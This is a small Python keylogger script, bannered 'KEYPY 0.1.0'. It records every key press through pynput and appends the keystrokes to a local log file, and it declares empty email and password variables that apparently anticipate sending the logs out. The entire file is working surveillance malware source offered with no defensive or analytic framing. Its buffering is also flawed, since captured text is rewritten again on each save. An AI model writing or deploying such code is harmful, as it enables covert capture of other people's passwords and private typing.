
# Modules

from pynput.keyboard import Key, Listener
import sys

# Logic

youremail = ""
youremailpass = ""
t = ""
s = 0

def write_keyboard(key):
    global t
    t += str(key)
    if len(t) > int(s):
        f = open('Logfile.txt', 'a')
        f.write(t.replace("'", ""))
        f.close()
        

if __name__ == "__main__":

    name = """
    ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░░██╗
    ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗╚██╗░██╔╝
    █████═╝░█████╗░░░╚████╔╝░██████╔╝░╚████╔╝░
    ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░░░╚██╔╝░░
    ██║░╚██╗███████╗░░░██║░░░██║░░░░░░░░██║░░░
    ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░ 0.1.0
    """

    print(name)
    
    s = input("How many characters are in the file: ")

    try:
        f = open("Logfile.txt", "a")
        f.close()
    except:
        f = open("Logfile.txt", "w")
        f.close()

    with Listener(on_press=write_keyboard) as listener:
        listener.join()
